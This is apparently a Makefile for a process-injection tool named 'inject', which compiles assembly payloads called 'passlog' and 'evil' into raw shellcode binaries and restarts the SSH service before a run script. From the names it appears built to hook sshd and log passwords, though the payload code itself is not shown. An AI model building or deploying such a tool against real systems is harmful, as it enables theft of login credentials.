all:
	#gcc -Wall -o passlog.elf passlog.s -nostartfiles -nodefaultlibs
	#objcopy -O binary -j .text passlog.elf passlog.bin

	#gcc -Wall -o evil.elf evil.s -nostartfiles -nodefaultlibs
	#objcopy -O binary -j .text evil.elf evil.bin

	#gcc -Wall -ggdb -I./include/ -o inject src/*.c evil.s
	gcc -Wall -ggdb -I./include/ -o inject src/*.c passlog.s

	#ls -la *.bin

run:
	/etc/init.d/ssh restart
	./run.sh

clean:
	rm -rf passlog.elf passlog.bin evil.elf evil.bin inject
